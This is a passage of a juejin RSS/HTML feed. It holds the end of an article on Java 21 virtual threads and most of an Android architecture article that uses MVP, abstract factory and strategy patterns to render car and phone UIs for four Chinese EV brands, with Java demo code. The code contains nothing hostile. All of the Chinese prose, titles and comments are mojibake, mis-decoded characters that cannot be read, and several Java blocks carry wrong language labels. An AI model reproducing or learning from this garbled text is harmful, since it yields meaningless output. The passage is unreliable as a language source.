Java21è™šæ‹Ÿ threadsä»æ ¹æœ¬ä¸Šé‡æ„äº†JVMçš„å¹¶å‘æ¨¡å‹ã€‚é€šè¿‡æœ¬æ–‡çš„çœŸå®æ¡ˆä¾‹å¯ä»¥çœ‹åˆ°ï¼Œåˆç†è¿ç”¨è¯¥ç‰¹æ€§èƒ½åœ¨ä¿æŒåŒæ­¥ç¼–ç¨‹æ¨¡å‹ç›´è§‚æ€§çš„åŒæ—¶ï¼Œå®ç°æ•°é‡çº§çš„æ€§èƒ½çªç ´ã€‚æŠ€æœ¯å›¢é˜Ÿç°åœ¨å°±åº”è¯¥å¼€å§‹è¯„ä¼°ç°æœ‰ç³»ç»Ÿçš„é€‚é…æ”¹é€ è·¯å¾„â€”â€”è¿™å·²ä¸ä»…æ˜¯æ€§èƒ½ä¼˜åŒ–é—®é¢˜ï¼Œæ›´æ˜¯å…³ä¹å¼€å‘æ•ˆç‡çš„é©å‘½æ€§å‡çº§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android ä¸€å¥—ä»£ç é€‚é…è½¦æœº/æ‰‹æœºæ¨ªç«–å±ï¼Ÿçœ‹æˆ‘å¦‚ä½•ç”¨æå®šå°ç±³ã€æ¯”äºšè¿ªã€è”šæ¥ã€ç†æƒ³ã€å¤šå“ç‰Œæ¶æ„è®¾è®¡]]></title>    <link>https://juejin.cn/post/7589126920286945290</link>    <guid>https://juejin.cn/post/7589126920286945290</guid>    <pubDate>2025-12-30T00:28:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126920286945290" data-draft-id="7588022226739101746" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android   ä¸€å¥—ä»£ç é€‚é…è½¦æœº/æ‰‹æœºæ¨ªç«–å±ï¼Ÿçœ‹æˆ‘å¦‚ä½•ç”¨æå®šå°ç±³ã€æ¯”äºšè¿ªã€è”šæ¥ã€ç†æƒ³ã€å¤šå“ç‰Œæ¶æ„è®¾è®¡"/> <meta itemprop="keywords" content="Android,é¢è¯•,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-30T00:28:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¹ç¨‹åå…«å°‘"/> <meta itemprop="url" content="https://juejin.cn/user/184373685534077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android   ä¸€å¥—ä»£ç é€‚é…è½¦æœº/æ‰‹æœºæ¨ªç«–å±ï¼Ÿçœ‹æˆ‘å¦‚ä½•ç”¨æå®šå°ç±³ã€æ¯”äºšè¿ªã€è”šæ¥ã€ç†æƒ³ã€å¤šå“ç‰Œæ¶æ„è®¾è®¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/184373685534077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¹ç¨‹åå…«å°‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:28:23.000Z" title="Tue Dec 30 2025 00:28:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.éœ€æ±‚ï¼š(3ç§è½¦æœº/æ‰‹æœºUIåˆ‡æ¢)</h2>
<p>Android æ–°èƒ½æºè½¦æœºï¼Œæ‰‹æœºç«–å±ï¼Œæ‰‹æœºæ¨ªå±3ç§æƒ…å†µçš„UI, æ•°æ®æ¥æºæœ‰å¤šä¸ªï¼Œåˆ†ä¸åŒçš„å“ç‰Œï¼Œæœ‰å°ç±³ï¼Œè”šæ¥ï¼Œç†æƒ³ï¼Œæ¯”äºšè¿ªï¼Œå¤§éƒ¨åˆ†ç›¸åŒï¼Œä»…ä»…æœ‰ä¸€ç‚¹å·®åˆ«</p>
<h2 data-id="heading-1">2.æ–¹æ¡ˆï¼š(æŠ½è±¡å·¥å‚+ç­–ç•¥æ¨¡å¼)</h2>
<p>ä¸ºäº†æ»¡è¶³ <strong>Android è½¦æœºã€æ‰‹æœºç«–å±ã€æ‰‹æœºæ¨ªå±</strong> ä¸‰ç§ UI åœºæ™¯ä¸‹ä½¿ç”¨ <strong>åŒä¸€ä»½æ•°æ®æºï¼ˆDataManagerï¼‰</strong> ï¼Œä¸” <strong>ä¸åŒå“ç‰Œé—´æ•°æ®ç»“æ„åŸºæœ¬ä¸€è‡´ã€ä»…å°‘é‡å·®å¼‚</strong> çš„éœ€æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹è®¾è®¡åŸåˆ™ï¼š</p>
<ul>
<li><strong>å•ä¸€æ•°æ®æº</strong>ï¼š<code>DataManager</code>Â æä¾›ç»Ÿä¸€æ¥å£ã€‚</li>
<li><strong>ç­–ç•¥æ¨¡å¼ / å·¥å‚æ¨¡å¼</strong>ï¼šæ ¹æ®è®¾å¤‡ç±»å‹å’Œå“ç‰ŒåŠ¨æ€æä¾›é€‚é…å™¨æˆ–è§†å›¾æ¨¡å‹ã€‚</li>
<li><strong>ä½è€¦åˆ + é«˜æ‰©å±•æ€§</strong>ï¼šUI å±‚ä¸ç›´æ¥ä¾èµ–å…·ä½“å“ç‰Œé€»è¾‘ï¼Œè€Œæ˜¯é€šè¿‡æŠ½è±¡æ¥å£è·å–æ•°æ®ã€‚</li>
</ul>
<p>æ ¹æ®éœ€æ±‚ï¼Œè¿™é‡Œé‡‡ç”¨MVPæ¨¡å¼+æŠ½è±¡å·¥å‚+ç­–ç•¥æ¨¡å¼æ¥å¤„ç†ä¸åŒå“ç‰Œå’Œè®¾å¤‡çš„UIå·®å¼‚ï¼š</p>
<h2 data-id="heading-2">3.æ¶æ„å›¾</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3940ed6e2e9045bd8e0396a1e09b0aff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP56iL5Y2B5YWr5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659302&amp;x-signature=O988NSBMuIlX1MSL6jcAFLFu%2FKo%3D" alt="è½¦æœºå’Œæ‰‹æœº.png" loading="lazy"/></p>
<h2 data-id="heading-3">4.ä¸»è¦çš„ä»£ç </h2>
<p>å› ä¸ºå…¬å¸çš„ä¿å¯†é—®é¢˜ï¼ŒæŠŠæ ¸å¿ƒçš„æ€æƒ³åˆ†ææˆä¸€ä¸ªdemoï¼å¦‚ä¸‹ï¼š</p>
<h4 data-id="heading-4">ğŸ”¹ æ•°æ®å±‚ï¼šç»Ÿä¸€æ¥å£</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">/**
 * å“ç‰Œæ•°æ®ç»Ÿä¸€æ¥å£ï¼ˆIBrandDataï¼‰
 * æ‰€æœ‰æ–°èƒ½æºæ±½è½¦å“ç‰Œå¿…é¡»å®ç°æ­¤æ¥å£ï¼Œä¿è¯ä¸Šå±‚è°ƒç”¨ä¸€è‡´æ€§
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IBrandData</span> {
    <span class="hljs-function">String <span class="hljs-title">getCommonField</span>()</span>;        <span class="hljs-comment">// é€šç”¨ä¿¡æ¯ï¼ˆå¦‚ç»­èˆªã€è½¦å‹ï¼‰</span>
    <span class="hljs-function">String <span class="hljs-title">getBrandSpecificField</span>()</span>; <span class="hljs-comment">// å“ç‰Œç‰¹æœ‰åŠŸèƒ½ï¼ˆå¦‚æ¢ç”µã€ç”Ÿæ€äº’è”ç­‰ï¼‰</span>
}
</code></pre>
<hr/>
<h4 data-id="heading-5">ğŸš— æ•°æ®å±‚å®ç°ï¼šå››ä¸ªå“ç‰Œï¼ˆå°ç±³ã€è”šæ¥ã€ç†æƒ³ã€æ¯”äºšè¿ªï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/** å°ç±³æ±½è½¦æ•°æ® */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaomiBrandData</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBrandData</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getCommonField</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"å°ç±³SU7 é€šç”¨ä¿¡æ¯ï¼š800Vé«˜å‹å¹³å°ï¼ŒCLTCç»­èˆª800km"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getBrandSpecificField</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"å°ç±³æ¾æ¹ƒOSç”Ÿæ€äº’è”ï¼šæ‰‹æœº-è½¦æœºæ— ç¼æµè½¬"</span>;
    }
}

<span class="hljs-comment">/** è”šæ¥æ±½è½¦æ•°æ® */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NIOBrandData</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBrandData</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getCommonField</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"è”šæ¥ET5 é€šç”¨ä¿¡æ¯ï¼šåŒç”µæœºå››é©±ï¼Œæ¢ç”µå…¼å®¹"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getBrandSpecificField</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"è”šæ¥æ¢ç”µç«™ + NOMIæ™ºèƒ½æƒ…æ„Ÿå¼•æ“"</span>;
    }
}

<span class="hljs-comment">/** ç†æƒ³æ±½è½¦æ•°æ® */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LiAutoBrandData</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBrandData</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getCommonField</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ç†æƒ³Lç³»åˆ— é€šç”¨ä¿¡æ¯ï¼šå®¶åº­å…­åº§SUVï¼Œå¢ç¨‹ç”µåŠ¨"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getBrandSpecificField</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"åŸå¸‚NOA + å¢ç¨‹å¼æ— é‡Œç¨‹ç„¦è™‘"</span>;
    }
}

<span class="hljs-comment">/** æ¯”äºšè¿ªæ±½è½¦æ•°æ® */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BYDBrandData</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBrandData</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getCommonField</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æ¯”äºšè¿ªæ±‰EV é€šç”¨ä¿¡æ¯ï¼šåˆ€ç‰‡ç”µæ± ï¼Œeå¹³å°3.0"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getBrandSpecificField</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"äº‘è¾‡æ™ºèƒ½è½¦èº«æ§åˆ¶ç³»ç»Ÿ + DiLinkç”Ÿæ€"</span>;
    }
}
</code></pre>
<hr/>
<h4 data-id="heading-6">ğŸ“± è®¾å¤‡ç±»å‹ &amp; UI ç­–ç•¥ï¼ˆä¿æŒä¸å˜ï¼Œä»…å¾®è°ƒæ³¨é‡Šï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * è®¾å¤‡ç±»å‹æšä¸¾ï¼šç”¨äºåŒºåˆ† UI æ¸²æŸ“ä¸Šä¸‹æ–‡
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> DeviceType {
    CAR,                <span class="hljs-comment">// è½¦è½½ä¸­æ§ï¼ˆå¤§å±ã€é©¾é©¶å®‰å…¨ä¼˜å…ˆï¼‰</span>
    PHONE_PORTRAIT,     <span class="hljs-comment">// æ‰‹æœºç«–å±ï¼ˆä¿¡æ¯ç²¾ç®€ï¼‰</span>
    PHONE_LANDSCAPE     <span class="hljs-comment">// æ‰‹æœºæ¨ªå±ï¼ˆä¿¡æ¯å®Œæ•´å±•ç¤ºï¼‰</span>
}

<span class="hljs-comment">/**
 * UI æ¸²æŸ“ç­–ç•¥æ¥å£ï¼šä¸åŒè®¾å¤‡ä½¿ç”¨ä¸åŒå±•ç¤ºé€»è¾‘
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUiStrategy</span> {
    void render(IBrandData <span class="hljs-keyword">data</span>);
}

<span class="hljs-comment">// å…·ä½“ç­–ç•¥å®ç°ï¼ˆç•¥ï¼ŒåŒä½ åŸæœ‰ä»£ç ï¼Œä»…æ¥å£åæ”¹ä¸º IBrandDataï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CarUiStrategy</span> <span class="hljs-title">implements</span> <span class="hljs-title">IUiStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> void render(IBrandData <span class="hljs-keyword">data</span>) {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"[CAR] "</span> + <span class="hljs-keyword">data</span>.getCommonField() + <span class="hljs-string">" | "</span> + <span class="hljs-keyword">data</span>.getBrandSpecificField());
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PhonePortraitStrategy</span> <span class="hljs-title">implements</span> <span class="hljs-title">IUiStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> void render(IBrandData <span class="hljs-keyword">data</span>) {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"[PHONE-PORTRAIT] "</span> + <span class="hljs-keyword">data</span>.getCommonField());
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PhoneLandscapeStrategy</span> <span class="hljs-title">implements</span> <span class="hljs-title">IUiStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> void render(IBrandData <span class="hljs-keyword">data</span>) {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"[PHONE-LANDSCAPE] "</span> + <span class="hljs-keyword">data</span>.getCommonField() + <span class="hljs-string">" + "</span> + <span class="hljs-keyword">data</span>.getBrandSpecificField());
    }
}
</code></pre>
<hr/>
<h4 data-id="heading-7">ğŸ§© æ•°æ®ç®¡ç†å™¨ï¼ˆDataManagerï¼‰â€”â€” æ”¯æŒå››å¤§å“ç‰Œ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.function.Supplier;

<span class="hljs-comment">/**
 * æ•°æ®ç®¡ç†å™¨ï¼šç»Ÿä¸€å…¥å£ï¼ŒæŒ‰å“ç‰Œè¿”å›å¯¹åº”æ•°æ®
 * ä½¿ç”¨å·¥å‚æ³¨å†Œæœºåˆ¶ï¼Œæ”¯æŒåŠ¨æ€æ‰©å±•
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, Supplier&lt;IBrandData&gt;&gt; BRAND_FACTORY = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-keyword">static</span> {
        BRAND_FACTORY.put(<span class="hljs-string">"xiaomi"</span>, XiaomiBrandData::<span class="hljs-keyword">new</span>);
        BRAND_FACTORY.put(<span class="hljs-string">"nio"</span>, NIOBrandData::<span class="hljs-keyword">new</span>);
        BRAND_FACTORY.put(<span class="hljs-string">"liauto"</span>, LiAutoBrandData::<span class="hljs-keyword">new</span>);
        BRAND_FACTORY.put(<span class="hljs-string">"byd"</span>, BYDBrandData::<span class="hljs-keyword">new</span>); <span class="hljs-comment">// âœ… æ–°å¢æ¯”äºšè¿ª</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String brand;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DataManager</span><span class="hljs-params">(String brand)</span> {
        <span class="hljs-built_in">this</span>.brand = brand.toLowerCase();
    }

    <span class="hljs-keyword">public</span> IBrandData <span class="hljs-title function_">getBrandData</span><span class="hljs-params">()</span> {
        Supplier&lt;IBrandData&gt; factory = BRAND_FACTORY.get(brand);
        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"ä¸æ”¯æŒçš„å“ç‰Œ: "</span> + brand + <span class="hljs-string">"ã€‚æ”¯æŒ: "</span> + BRAND_FACTORY.keySet());
        }
        <span class="hljs-keyword">return</span> factory.get();
    }
}
</code></pre>
<hr/>
<h4 data-id="heading-8">ğŸ”— UI åè°ƒå™¨ï¼ˆæ ¸å¿ƒé€‚é…å™¨ï¼‰</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">/**
 * UI åè°ƒå™¨ï¼šç»„åˆå“ç‰Œæ•°æ® + è®¾å¤‡ç­–ç•¥
 * æ˜¯ MVP ä¸­ Presenter å±‚çš„ç†æƒ³è½½ä½“
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UiCoordinator</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DataManager dataManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> IUiStrategy uiStrategy;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">UiCoordinator</span><span class="hljs-params">(<span class="hljs-type">String</span> brand, DeviceType deviceType)</span> </span>{
        <span class="hljs-keyword">this</span>.dataManager = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataManager</span>(brand);
        <span class="hljs-keyword">this</span>.uiStrategy = <span class="hljs-built_in">createStrategy</span>(deviceType);
    }

    <span class="hljs-function"><span class="hljs-keyword">private</span> IUiStrategy <span class="hljs-title">createStrategy</span><span class="hljs-params">(DeviceType type)</span> </span>{
        <span class="hljs-keyword">switch</span> (type) {
            <span class="hljs-keyword">case</span> CAR: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">CarUiStrategy</span>();
            <span class="hljs-keyword">case</span> PHONE_PORTRAIT: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">PhonePortraitStrategy</span>();
            <span class="hljs-keyword">case</span> PHONE_LANDSCAPE: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">PhoneLandscapeStrategy</span>();
            <span class="hljs-keyword">default</span>: <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">IllegalStateException</span>(<span class="hljs-string">"æœªçŸ¥è®¾å¤‡ç±»å‹: "</span> + type);
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span> </span>{
        IBrandData data = dataManager.<span class="hljs-built_in">getBrandData</span>();
        uiStrategy.<span class="hljs-built_in">render</span>(data);
    }
}
</code></pre>
<hr/>
<h4 data-id="heading-9">ğŸ–¥ï¸ ä¸»ç¨‹åºï¼ˆæµ‹è¯•å…¥å£ï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">String</span>[] brands = {<span class="hljs-string">"xiaomi"</span>, <span class="hljs-string">"nio"</span>, <span class="hljs-string">"liauto"</span>, <span class="hljs-string">"byd"</span>}; <span class="hljs-comment">// âœ… åŒ…å«æ¯”äºšè¿ªï¼Œä¸å«å°é¹</span>
        <span class="hljs-title class_">DeviceType</span>[] devices = {<span class="hljs-title class_">DeviceType</span>.<span class="hljs-property">CAR</span>, <span class="hljs-title class_">DeviceType</span>.<span class="hljs-property">PHONE_PORTRAIT</span>, <span class="hljs-title class_">DeviceType</span>.<span class="hljs-property">PHONE_LANDSCAPE</span>};

        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">String</span> brand : brands) {
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"ğŸ”¹ å“ç‰Œ: "</span> + brand.<span class="hljs-title function_">toUpperCase</span>());
            <span class="hljs-keyword">for</span> (<span class="hljs-title class_">DeviceType</span> device : devices) {
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">UiCoordinator</span>(brand, device).<span class="hljs-title function_">display</span>();
            }
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>();
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-10">âœ… æœ€ç»ˆæ¶æ„å›¾</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span>
<span class="hljs-operator">|</span>   UI å±•ç¤ºå±‚ (<span class="hljs-keyword">View</span>)  <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span> Activity<span class="hljs-operator">/</span>Fragment <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span> æ ¹æ®é…ç½®è°ƒç”¨      <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>   UiCoordinator     <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+----------+</span>
           <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------v----------+</span>
<span class="hljs-operator">|</span>  é€‚é…å±‚ (Presenter) <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span> UiCoordinator     <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span> IUiStrategy       <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span> DeviceType        <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------+----------+</span>
           <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------v----------+</span>
<span class="hljs-operator">|</span>    æ•°æ®å±‚ (Model)   <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span> DataManager       <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span> IBrandData        <span class="hljs-operator">|</span>
